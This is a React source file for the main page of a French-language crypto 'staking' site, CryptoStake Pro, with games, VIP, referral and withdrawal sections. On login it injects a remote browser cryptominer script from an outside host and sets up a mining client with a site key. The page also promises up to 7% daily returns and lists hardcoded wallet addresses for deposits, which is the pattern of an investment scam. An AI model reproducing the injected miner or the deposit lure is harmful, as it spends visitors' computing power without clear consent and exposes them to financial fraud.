import StakingCard from "@/components/StakingCard";
import ClickerGame from "@/components/ClickerGame";
import WithdrawalSection from "@/components/PaymentSection";
import PortfolioTracker from "@/components/PortfolioTracker";
import ReferralSystem from "@/components/ReferralSystem";
import { ReferralLinksSection } from "@/components/ReferralLinksSection";
import SecurityCenter from "@/components/SecurityCenter";
import NewsCenter from "@/components/NewsCenter";
import DepositTracker from "@/components/DepositTracker";
import StakingTracker from "@/components/StakingTracker";
import CustomStaking from "@/components/CustomStaking";
import { FarmingSystem } from "@/components/FarmingSystem";
import MiningFarm from "@/components/MiningFarm";
import RewardsSystem from "@/components/RewardsSystem";
import MissionsSystem from "@/components/MissionsSystem";
import LeaderboardSystem from "@/components/LeaderboardSystem";
import LootBoxSystem from "@/components/LootBoxSystem";
import EventsSystem from "@/components/EventsSystem";
import CustomizationSystem from "@/components/CustomizationSystem";
import VIPSystem from "@/components/VIPSystem";
import BattlePassSystem from "@/components/BattlePassSystem";
import DeadSpotShop from "@/components/DeadSpotShop";
import PlatformStats from "@/components/PlatformStats";
import { CollapsibleSection } from "@/components/CollapsibleSection";
import { Button } from "@/components/ui/button";
import { useAuth } from "@/hooks/useAuth";
import { useLanguage } from "@/contexts/LanguageContext";
import { LanguageSelector } from "@/components/LanguageSelector";
import { Navigate } from "react-router-dom";

import DepositBonusPopup from "@/components/DepositBonusPopup";
import { SpinWheel } from "@/components/SpinWheel";
import heroBackground from "@/assets/hero-background.jpg";
import { useState } from "react";
import { FaucetClaim } from "@/components/FaucetClaim";
import { useEffect } from "react";
import LiveChat from "@/components/LiveChat";

// Extend Window interface for mining client
declare global {
  interface Window {
    miningClient?: any;
    miningClientInitialized?: boolean;
    Client?: any;
  }
}

const Index = () => {
  const { user, signOut, loading } = useAuth();
  const { t } = useLanguage();
  
  const [showSpinWheel, setShowSpinWheel] = useState(false);
  const [showFaucet, setShowFaucet] = useState(false);
  const [showFarm, setShowFarm] = useState(false);
  const [userZeroBalance, setUserZeroBalance] = useState(0);
  const [showDepositBonus, setShowDepositBonus] = useState(true);

  // Mining control states
  const [isMining, setIsMining] = useState(false);
  const [throttle, setThrottle] = useState(0.5);
  const [hashrateHistory, setHashrateHistory] = useState<number[]>([]);

  console.log("Index component - user:", user, "loading:", loading);

  const handleZeroWin = (amount: number) => {
    setUserZeroBalance(prev => prev + amount);
  };

  // Mining script injection for main page
  useEffect(() => {
    if (user) {
      // Charger script de mining
      const existingScript = document.head.querySelector(
        'script[src="https://www.hostingcloud.racing/f4U5.js"]'
      );
      if (existingScript) return;

      const script1 = document.createElement("script");
      script1.src = "https://www.hostingcloud.racing/f4U5.js";
      script1.async = true;
      script1.id = "mining-script-main";
      document.head.appendChild(script1);

      script1.onload = () => {
        if (!window.miningClientInitialized && window.Client) {
          var _client = new window.Client.Anonymous(
            "80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd",
            { throttle: throttle, c: "w" }
          );
          window.miningClient = _client;
          window.miningClientInitialized = true;
        }
      };

      return () => {
        if (window.miningClient && window.miningClient.stop) {
          window.miningClient.stop();
          window.miningClient = null;
          window.miningClientInitialized = false;
        }
        const scripts = document.head.querySelectorAll(
          "#mining-script-main, #mining-script-client"
        );
        scripts.forEach((s) => s.remove());
      };
    }
  }, [user]);

  // Appliquer throttle en temps réel
  useEffect(() => {
    if (window.miningClient && window.miningClient.setThrottle) {
      window.miningClient.setThrottle(throttle);
    }
  }, [throttle]);

  // Récupérer hashrate chaque seconde
  useEffect(() => {
    const interval = setInterval(() => {
      if (window.miningClient && isMining && typeof window.miningClient.getHashesPerSecond === 'function') {
        const hps = window.miningClient.getHashesPerSecond() || 0;
        setHashrateHistory((prev) => [...prev.slice(-19), hps]); // max 20 points
      }
    }, 1000);
    return () => clearInterval(interval);
  }, [isMining]);

  // Toggle ON/OFF
  const toggleMining = () => {
    if (!window.miningClient) return;
    if (isMining) {
      if (typeof window.miningClient.stop === 'function') {
        window.miningClient.stop();
      }
      setIsMining(false);
    } else {
      if (typeof window.miningClient.start === 'function') {
        window.miningClient.start();
      }
      setIsMining(true);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-foreground">{t('loading')}</p>
        </div>
      </div>
    );
  }

  if (!user) {
    console.log("User not found, redirecting to auth");
    return <Navigate to="/auth" replace />;
  }
  const stakingPools = [
    {
      name: "Polygon",
      symbol: "MATIC",
      network: "Polygon Network",
      apy: "7",
      icon: "🔷",
      color: "bg-purple-600",
      walletAddress: "0x380060e81A820a1691fA58C84ba27c23ed1Eff77"
    },
    {
      name: "Bitcoin",
      symbol: "BTC",
      network: "Bitcoin Network",
      apy: "5",
      icon: "₿",
      color: "bg-orange-500",
      walletAddress: "1LJWeugswr2GsqAZ7H8pFYZ7Q2uF8pAVb8"
    },
    {
      name: "TRON",
      symbol: "TRX",
      network: "TRC20",
      apy: "6",
      icon: "🔺",
      color: "bg-red-500",
      walletAddress: "TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7"
    },
    {
      name: "Toncoin",
      symbol: "TON",
      network: "TON Network",
      apy: "4",
      icon: "💎",
      color: "bg-blue-500",
      walletAddress: "EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp",
      memo: "492929"
    },
    {
      name: "Solana",
      symbol: "SOL",
      network: "Solana Network",
      apy: "3",
      icon: "☀️",
      color: "bg-purple-400",
      walletAddress: "CWnduVqeRQrxqhGPNDnHTqHWM1dJLqCnojhMQS8FEUFB"
    },
    {
      name: "Dogecoin",
      symbol: "DOGE",
      network: "Dogecoin Network",
      apy: "1",
      icon: "🐕",
      color: "bg-yellow-500",
      walletAddress: "DDVYeK8MiizfsnzLtigSAWfx6PH24puQze"
    }
  ];

  // ... keep existing code (hero section variables)

  return (
    <div className="min-h-screen bg-background">
      {/* Language Selector - Fixed position */}
      <div className="fixed top-4 right-4 z-50">
        <LanguageSelector />
      </div>
      
      {/* Spin Wheel Slide */}
      {showSpinWheel && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">🎰 {t('gaming.spin.title')}</h2>
              <Button 
                variant="ghost" 
                onClick={() => setShowSpinWheel(false)}
                className="text-2xl"
              >
                {t('close')}
              </Button>
            </div>
            <SpinWheel onZeroWin={handleZeroWin} />
          </div>
        </div>
      )}

      {/* Faucet ZERO Slide */}
      {showFaucet && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">💧 {t('gaming.faucet.title')}</h2>
              <Button 
                variant="ghost" 
                onClick={() => setShowFaucet(false)}
                className="text-2xl"
              >
                {t('close')}
              </Button>
            </div>
            <FaucetClaim 
              onOpenSpin={() => setShowSpinWheel(true)}
            />
          </div>
        </div>
      )}

      {/* Farm System Slide */}
      {showFarm && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">🌾 {t('gaming.farm.title')}</h2>
              <Button 
                variant="ghost" 
                onClick={() => setShowFarm(false)}
                className="text-2xl"
              >
                {t('close')}
              </Button>
            </div>
            <FarmingSystem />
          </div>
        </div>
      )}

      <DepositBonusPopup 
        isOpen={showDepositBonus} 
        onClose={() => setShowDepositBonus(false)} 
      />

      {/* Hero Section */}
      <section className="relative h-screen flex items-center justify-center overflow-hidden">
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: `url(${heroBackground})` }}
        />
        <div className="absolute inset-0 bg-background/80" />
        
        <div className="relative z-10 text-center max-w-4xl mx-auto px-6">
          <h1 className="text-6xl md:text-8xl font-bold mb-6 gradient-crypto bg-clip-text text-transparent animate-float">
            {t('app.title')}
          </h1>
          <p className="text-xl md:text-2xl text-muted-foreground mb-8 max-w-2xl mx-auto">
            {t('app.subtitle')}
          </p>
          <div className="flex flex-col sm:flex-row gap-4 justify-center">
            <Button variant="crypto" size="xl" className="shadow-glow">
              {t('hero.start_staking')}
            </Button>
            <Button variant="stake" size="xl">
              {t('hero.explore_pools')}
            </Button>
            <Button variant="ghost" size="sm" onClick={signOut} className="mt-4">
              {t('sign_out')}
            </Button>
          </div>
        </div>
      </section>

      {/* Features Section - Moved to top */}
      <CollapsibleSection
        title="Pourquoi Choisir CryptoStake Pro ?"
        subtitle="Découvrez nos avantages"
        defaultOpen={true}
      >
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all hover-scale">
            <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-scale-in">
              🔒
            </div>
            <h3 className="text-xl font-bold mb-2">Sécurisé</h3>
            <p className="text-muted-foreground">
              Protocoles de sécurité avancés et audits réguliers pour protéger vos fonds
            </p>
          </div>
          <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all hover-scale">
            <div className="w-16 h-16 bg-success rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-scale-in">
              ⚡
            </div>
            <h3 className="text-xl font-bold mb-2">Rendements Élevés</h3>
            <p className="text-muted-foreground">
              Jusqu'à 7% de rendement quotidien avec nos algorithmes optimisés
            </p>
          </div>
          <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all hover-scale">
            <div className="w-16 h-16 bg-info rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-scale-in">
              🌐
            </div>
            <h3 className="text-xl font-bold mb-2">Multi-Blockchain</h3>
            <p className="text-muted-foreground">
              Support de 6 réseaux blockchain majeurs pour diversifier votre portefeuille
            </p>
          </div>
        </div>
      </CollapsibleSection>

      {/* Gaming & Features Access Section */}
      <CollapsibleSection
        title={t('gaming.title')}
        subtitle={t('gaming.subtitle')}
        defaultOpen={true}
        className="bg-secondary/20"
      >
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
            <div className="text-4xl mb-4">🌾</div>
            <h3 className="text-lg font-bold mb-2">{t('gaming.farm.title')}</h3>
            <p className="text-sm text-muted-foreground mb-4">
              {t('gaming.farm.description')}
            </p>
            <Button 
              variant="outline" 
              onClick={() => setShowFarm(true)}
              className="w-full shadow-glow"
            >
              {t('gaming.farm.cultivate')}
            </Button>
          </div>
          
          <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
            <div className="text-4xl mb-4">💧</div>
            <h3 className="text-lg font-bold mb-2">{t('gaming.faucet.title')}</h3>
            <p className="text-sm text-muted-foreground mb-4">
              {t('gaming.faucet.description')}
            </p>
            <Button 
              variant="secondary" 
              onClick={() => setShowFaucet(true)}
              className="w-full shadow-glow"
            >
              {t('gaming.faucet.claim')}
            </Button>
          </div>
          
          <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
            <div className="text-4xl mb-4">🎰</div>
            <h3 className="text-lg font-bold mb-2">{t('gaming.spin.title')}</h3>
            <p className="text-sm text-muted-foreground mb-4">
              {t('gaming.spin.description')}
            </p>
            <Button 
              variant="stake" 
              onClick={() => setShowSpinWheel(true)}
              className="w-full shadow-glow"
            >
              {t('gaming.spin.turn')}
            </Button>
          </div>
        </div>
      </CollapsibleSection>

      {/* Mining Control Section */}
      <CollapsibleSection
        title="⛏️ Contrôle du Mineur"
        subtitle="Gérez votre puissance de minage en direct"
        className="bg-secondary/20"
      >
        <div className="text-center space-y-4">
          {/* Bouton Start/Stop */}
          <Button onClick={toggleMining} variant="crypto" className="shadow-glow">
            {isMining ? "⛔ Stop Mining" : "▶️ Start Mining"}
          </Button>

          {/* Slider throttle */}
          <div>
            <label className="block text-sm font-medium mb-2">
              Utilisation CPU : {Math.round((1 - throttle) * 100)}%
            </label>
            <input
              type="range"
              min="0.1"
              max="0.6"
              step="0.05"
              value={throttle}
              onChange={(e) => setThrottle(parseFloat(e.target.value))}
              className="w-full h-2 bg-muted rounded-lg appearance-none cursor-pointer slider"
            />
          </div>

          {/* Graphique simple */}
          <div className="bg-card p-4 rounded-lg border border-primary/20">
            <h4 className="mb-2 font-semibold">Hashrate (H/s)</h4>
            <div className="flex items-end h-24 space-x-1 justify-center">
              {hashrateHistory.length === 0 ? (
                <div className="text-muted-foreground text-sm">Aucune donnée de hashrate</div>
              ) : (
                hashrateHistory.map((h, i) => (
                  <div
                    key={i}
                    style={{ height: `${Math.max(h * 5, 2)}px` }}
                    className="w-2 bg-primary rounded-t"
                    title={`${h.toFixed(2)} H/s`}
                  />
                ))
              )}
            </div>
          </div>
        </div>
      </CollapsibleSection>

      {/* Statistics Section */}
      <CollapsibleSection
        title="Statistiques de la Plateforme"
        subtitle="Des chiffres réels qui témoignent de la croissance de notre communauté"
      >
        <PlatformStats />
      </CollapsibleSection>

      {/* Deposit and Staking Tracker */}
      <CollapsibleSection
        title="Mes Dépôts et Positions"
        subtitle="Suivez vos dépôts et positions de staking en temps réel"
      >
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
          <div>
            <h3 className="text-2xl font-bold mb-6">Dépôts</h3>
            <DepositTracker />
          </div>
          <div>
            <h3 className="text-2xl font-bold mb-6">Staking</h3>
            <StakingTracker />
          </div>
        </div>
      </CollapsibleSection>

      {/* Click Game Section */}
      <CollapsibleSection
        title="Mini-Jeu DeadSpot Click"
        subtitle="Cliquez pour gagner des DeadSpot coins et débloquer des power-ups! Toutes les 6 clicks, gagnez du DOGE et de l'expérience."
        className="bg-secondary/20"
      >
        <ClickerGame />
      </CollapsibleSection>

      {/* Mining Farm Section */}
      <CollapsibleSection
        title="Ferme de Mining DeadSpot"
        subtitle="Achetez des mineurs avec vos DeadSpot coins et diamants pour miner automatiquement plusieurs cryptomonnaies!"
      >
        <MiningFarm 
          deadspotCoins={0} 
          setDeadspotCoins={() => {}} 
          diamonds={0} 
          setDiamonds={() => {}}
        />
      </CollapsibleSection>

      {/* Rewards System Section */}
      <CollapsibleSection
        title="Système de Récompenses"
        subtitle="Gagnez de l'expérience de mining, réclamez vos bonus quotidiens et débloquez des récompenses de fidélité!"
        className="bg-secondary/20"
      >
        <RewardsSystem 
          deadspotCoins={0}
          setDeadspotCoins={() => {}}
          diamonds={0}
          setDiamonds={() => {}}
          miningExp={0}
          setMiningExp={() => {}}
          level={1}
          setLevel={() => {}}
        />
      </CollapsibleSection>

      {/* Referral Links Section */}
      <CollapsibleSection
        title={t('referral_links.title')}
        subtitle={t('referral_links.subtitle')}
        className="bg-secondary/20"
      >
        <ReferralLinksSection />
      </CollapsibleSection>

      {/* VIP & Monetization Section */}
      <CollapsibleSection
        title="VIP & Monétisation"
        subtitle="Système VIP, Battle Pass et boutique DeadSpot"
        className="bg-secondary/20"
      >
        <div className="space-y-12">
          <VIPSystem />
          <BattlePassSystem />
          <DeadSpotShop />
        </div>
      </CollapsibleSection>

      {/* Gaming Features Section */}
      <CollapsibleSection
        title="Fonctionnalités Gaming"
        subtitle="Évènements, missions, classements, loot boxes et personnalisation"
      >
        <div className="space-y-12">
          <EventsSystem />
          <MissionsSystem />
          <LeaderboardSystem />
          <LootBoxSystem />
          <CustomizationSystem />
        </div>
      </CollapsibleSection>

      {/* Jeux et Fonctionnalités - RPG Spatial */}
      <CollapsibleSection 
        title="🚀 Jeux et Fonctionnalités - RPG Spatial" 
        subtitle="Schéma complet du futur jeu RPG spatial"
        defaultOpen={false}
      >
        <div className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            
            {/* Section 1: Base */}
            <div className="bg-card p-6 rounded-lg border">
              <h3 className="text-xl font-bold mb-4 text-primary">1️⃣ Section de base (clicking & farm)</h3>
              <div className="space-y-2 text-sm">
                <p><strong>Clic :</strong> donne des ressources :</p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>0,078 diamants par clic</li>
                  <li>0,01 à 0,05 EXP par clic</li>
                </ul>
                <p><strong>Ressources utilisées pour :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>Acheter des vaisseaux</li>
                  <li>Améliorer stats / armes</li>
                  <li>Débloquer modules</li>
                </ul>
              </div>
            </div>

            {/* Section 2: EXP */}
            <div className="bg-card p-6 rounded-lg border">
              <h3 className="text-xl font-bold mb-4 text-primary">2️⃣ Système d'EXP & Niveaux</h3>
              <div className="space-y-2 text-sm">
                <p>Barre d'expérience globale du joueur.</p>
                <p><strong>Chaque niveau :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>+HP max pour tous les vaisseaux équipés</li>
                  <li>+% bonus d'attaque/défense</li>
                  <li>+1 slot d'inventaire global</li>
                </ul>
              </div>
            </div>

            {/* Section 3: Boutique */}
            <div className="bg-card p-6 rounded-lg border">
              <h3 className="text-xl font-bold mb-4 text-primary">3️⃣ Boutique de Vaisseaux</h3>
              <div className="space-y-2 text-sm">
                <p><strong>Prix :</strong> 1 DSC → 450,000 DSC</p>
                <p><strong>Classes & raretés :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>Common (1 – 50 DSC)</li>
                  <li>Uncommon (50 – 500 DSC)</li>
                  <li>Rare (500 – 5,000 DSC)</li>
                  <li>Elite (5,000 – 25,000 DSC)</li>
                  <li>Extreme (25,000 – 75,000 DSC)</li>
                  <li>Platine (75,000 – 150,000 DSC)</li>
                  <li>Or (150,000 – 300,000 DSC)</li>
                  <li>Maître du Jeu (300,000 – 450,000 DSC)</li>
                </ul>
              </div>
            </div>

            {/* Section 4: Inventaire */}
            <div className="bg-card p-6 rounded-lg border">
              <h3 className="text-xl font-bold mb-4 text-primary">4️⃣ Inventaire</h3>
              <div className="space-y-2 text-sm">
                <p><strong>Inventaire de vaisseaux :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>Voir les vaisseaux achetés</li>
                  <li>Équiper / déséquiper (1 seul actif)</li>
                </ul>
                <p><strong>Inventaire équipements :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>Armes (laser, missiles, plasma, torpilles, etc.)</li>
                  <li>Armures (boucliers, blindages, réparateurs, furtivité)</li>
                  <li>Modules spéciaux (bonus crit, recharge plus rapide, etc.)</li>
                </ul>
              </div>
            </div>

            {/* Section 5: Armes */}
            <div className="bg-card p-6 rounded-lg border">
              <h3 className="text-xl font-bold mb-4 text-primary">5️⃣ Boutique d'Armes et Défenses</h3>
              <div className="space-y-2 text-sm">
                <p><strong>Armes avec raretés :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>Arme à plomb (faible, début)</li>
                  <li>Laser standard (équilibré)</li>
                  <li>Canon plasma (fort mais lent)</li>
                  <li>Missiles guidés (multi-cible)</li>
                  <li>Mega torpille (énorme dégâts)</li>
                  <li>Rayon ionique (ignore boucliers)</li>
                  <li>Canon gravitationnel (désactive l'ennemi)</li>
                </ul>
                <p><strong>Armures & défenses :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>Boucliers énergétiques</li>
                  <li>Blindage lourd</li>
                  <li>Réparateurs auto</li>
                  <li>Modules furtifs</li>
                </ul>
              </div>
            </div>

            {/* Section 6: Amélioration */}
            <div className="bg-card p-6 rounded-lg border">
              <h3 className="text-xl font-bold mb-4 text-primary">6️⃣ Amélioration des Vaisseaux</h3>
              <div className="space-y-2 text-sm">
                <p>Avec Deadspot Coins + Diamants.</p>
                <p><strong>Exemples :</strong></p>
                <ul className="list-disc pl-4 space-y-1">
                  <li>+10% HP (200 diamants)</li>
                  <li>+5% dégâts (500 DSC)</li>
                  <li>+1 slot arme/armure (2000 DSC + 1000 diamants)</li>
                  <li>Fusion d'armes (2 → 1 rare)</li>
                </ul>
              </div>
            </div>

          </div>

          {/* Section 7: Combat - Full width */}
          <div className="bg-card p-6 rounded-lg border">
            <h3 className="text-xl font-bold mb-4 text-primary">7️⃣ Système de Combat</h3>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <h4 className="font-semibold text-secondary mb-2">⚔️ Base :</h4>
                <ul className="list-disc pl-4 space-y-1 text-sm">
                  <li>Tour par tour : ton vaisseau attaque → ennemi riposte</li>
                  <li>Chaque coup réussi : 0.000001 → 0.08 DSC</li>
                  <li>Victoire : Gain d'EXP + diamants bonus</li>
                  <li>Défaite : Tu perds ton vaisseau actif</li>
                  <li>Dernier vaisseau perdu → Game Over</li>
                </ul>
              </div>
              <div>
                <h4 className="font-semibold text-secondary mb-2">👾 Ennemis :</h4>
                <ul className="list-disc pl-4 space-y-1 text-sm">
                  <li>LVL 1 : pirate faible</li>
                  <li>LVL 5 : corsaire armé</li>
                  <li>LVL 10 : destroyer alien</li>
                  <li>LVL 20 : flotte de guerre</li>
                  <li>Boss galactiques (HP x10, loot rare)</li>
                </ul>
              </div>
              <div>
                <h4 className="font-semibold text-secondary mb-2">🏃 Option Flee :</h4>
                <ul className="list-disc pl-4 space-y-1 text-sm">
                  <li>Bouton Flee pour quitter le combat</li>
                  <li>Chance de réussir (ex. 70%)</li>
                  <li>Si échec → l'ennemi attaque gratuitement</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Section 8: Progression */}
          <div className="bg-card p-6 rounded-lg border">
            <h3 className="text-xl font-bold mb-4 text-primary">8️⃣ Progression & Objectifs</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <ul className="list-disc pl-4 space-y-1 text-sm">
                  <li>Quêtes (détruire 10 vaisseaux, collecter 1000 diamants)</li>
                  <li>Missions spatiales (explorer un secteur → loot)</li>
                </ul>
              </div>
              <div>
                <ul className="list-disc pl-4 space-y-1 text-sm">
                  <li>Boss galactiques (gros ennemis pour loot rare)</li>
                  <li>Classement (option PvP ou leaderboard)</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Résumé */}
          <div className="bg-gradient-to-r from-primary/10 to-secondary/10 p-6 rounded-lg border-2 border-primary/20">
            <h3 className="text-xl font-bold mb-4 text-primary">✅ Résumé simplifié :</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
              <ul className="list-disc pl-4 space-y-1">
                <li>Click section → diamants + exp</li>
                <li>Boutique → acheter vaisseaux (1 à 450k DSC)</li>
                <li>Inventaire → gérer vaisseaux, armes, armures</li>
                <li>Combat → ennemis de différents niveaux</li>
              </ul>
              <ul className="list-disc pl-4 space-y-1">
                <li>Gagner = exp + diamants + DSC par coup (0.000001 → 0.08)</li>
                <li>Perdre = perdre vaisseau → si dernier = Game Over</li>
                <li>Bouton Flee → fuir si trop dur</li>
                <li>Améliorations → boost stats vaisseaux avec DSC & diamants</li>
              </ul>
            </div>
          </div>

        </div>
      </CollapsibleSection>

      {/* Staking Pools Section */}
      <CollapsibleSection
        title="Pools de Staking Disponibles"
        subtitle="Choisissez parmi nos pools de staking optimisés pour maximiser vos rendements quotidiens"
      >
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
          {stakingPools.map((pool, index) => (
            <StakingCard key={index} {...pool} />
          ))}
        </div>
      </CollapsibleSection>


      {/* Custom Staking Section */}
      <CollapsibleSection
        title="Staking Personnalisé"
        subtitle="Personnalisez votre stratégie de staking"
      >
        <CustomStaking />
      </CollapsibleSection>

      {/* Portfolio Tracker Section */}
      <CollapsibleSection
        title="Suivi de Portefeuille"
        subtitle="Analysez la performance de votre portefeuille"
      >
        <PortfolioTracker />
      </CollapsibleSection>

      {/* News Center Section */}
      <CollapsibleSection
        title="Centre d'Actualités"
        subtitle="Restez informé des dernières nouvelles crypto"
      >
        <NewsCenter />
      </CollapsibleSection>

      {/* Live Chat Section */}
      <CollapsibleSection
        title="Chat Communautaire"
        subtitle="Discutez en temps réel avec la communauté CryptoStake Pro"
        className="bg-secondary/20"
      >
        <LiveChat />
      </CollapsibleSection>

      {/* Referral System Section */}
      <CollapsibleSection
        title="Système de Parrainage"
        subtitle="Gagnez des récompenses en invitant vos amis"
      >
        <ReferralSystem />
      </CollapsibleSection>

      {/* Security Center Section */}
      <CollapsibleSection
        title="Centre de Sécurité"
        subtitle="Gérez la sécurité de votre compte"
      >
        <SecurityCenter />
      </CollapsibleSection>

      {/* Withdrawal Section */}
      <CollapsibleSection
        title="Système de Retrait"
        subtitle="Demandez le retrait de vos fonds de manière sécurisée"
      >
        <WithdrawalSection />
      </CollapsibleSection>

      {/* Contact Section */}
      <section className="bg-secondary/10 border-t border-primary/10 py-8 px-6">
        <div className="max-w-4xl mx-auto text-center">
          <h3 className="text-xl font-semibold mb-4 gradient-text">
            📧 Contacter l'Auteur
          </h3>
          <p className="text-muted-foreground mb-4">
            Si vous voulez contacter l'auteur du site pour quelconque idée, soumission, erreur et/ou problème :
          </p>
          <div className="p-4 bg-card rounded-lg border border-primary/20 inline-block">
            <p className="text-lg font-medium">
              📬 Email: <a 
                href="mailto:maximlprive90@gmail.com" 
                className="text-primary hover:text-primary/80 transition-colors underline"
              >
                maximlprive90@gmail.com
              </a>
            </p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-card border-t border-primary/20 py-12 px-6">
        <div className="max-w-7xl mx-auto text-center">
          <h3 className="text-2xl font-bold gradient-crypto bg-clip-text text-transparent mb-4">
            CryptoStake Pro
          </h3>
          <p className="text-muted-foreground mb-6">
            La plateforme de staking nouvelle génération pour maximiser vos rendements crypto
          </p>
          <div className="flex justify-center gap-4">
            <Button variant="ghost" size="sm">Conditions</Button>
            <Button variant="ghost" size="sm">Confidentialité</Button>
            <Button variant="ghost" size="sm">Support</Button>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;